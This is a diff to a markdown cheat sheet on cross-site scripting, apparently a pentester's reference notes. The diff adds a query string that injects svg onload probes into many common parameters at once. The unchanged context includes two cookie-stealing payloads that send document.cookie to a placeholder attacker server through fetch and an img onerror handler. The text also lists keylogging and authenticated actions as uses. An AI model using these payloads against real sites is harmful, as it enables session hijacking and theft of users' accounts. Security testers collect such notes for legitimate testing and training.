@@ -7,6 +7,9 @@ pagetitle: XSS
 - Cross-site Scripting occurs when you can inject arbitrary JavaScript into another user's page
 - Very nice for performing authenticated actions, keylogging, or stealing cookies if they aren't HttpOnly
 
+**Checking Common Parameters**
+- Try something like `/?uname='>"<svg/onload=confirm('xss-uname')>&command='>"<svg/onload=confirm('xss-command')>&reverse='>"<svg/onload=confirm('xss-reverse')>&cancel='>"<svg/onload=confirm('xss-cancel')>&h='>"<svg/onload=confirm('xss-h')>&logout='>"<svg/onload=confirm('xss-logout')>&section='>"<svg/onload=confirm('xss-section')>&gid='>"<svg/onload=confirm('xss-gid')>&input='>"<svg/onload=confirm('xss-input')>&post_type='>"<svg/onload=confirm('xss-post_type')>&page='>"<svg/onload=confirm('xss-page')>&updated='>"<svg/onload=confirm('xss-updated')>&charset='>"<svg/onload=confirm('xss-charset')>&v='>"<svg/onload=confirm('xss-v')>` to test a bunch of parameters at once
+
 **Stealing Cookies**
 - `<script>fetch('http://{server}?c='+document.cookie)</script>`
 - `<img src=x onerror=this.src='http://{server}/?c='+document.cookie>`
